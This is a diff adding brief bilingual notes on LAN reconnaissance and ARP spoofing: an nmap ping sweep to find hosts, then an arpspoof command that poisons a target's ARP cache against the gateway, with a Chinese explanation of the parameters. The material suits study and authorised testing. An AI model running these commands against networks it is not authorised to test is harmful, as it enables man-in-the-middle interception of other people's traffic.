@@ -1,0 +1,8 @@
+1. LAN IP & Mac
+# nmap -sP 192.168.1.0/24
+
+2. ARP（Address Resolution Protocol）
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+// arpspoof的命令参数解释:
+arpspoof -i 本机网卡 -t 目标IP 网关IP
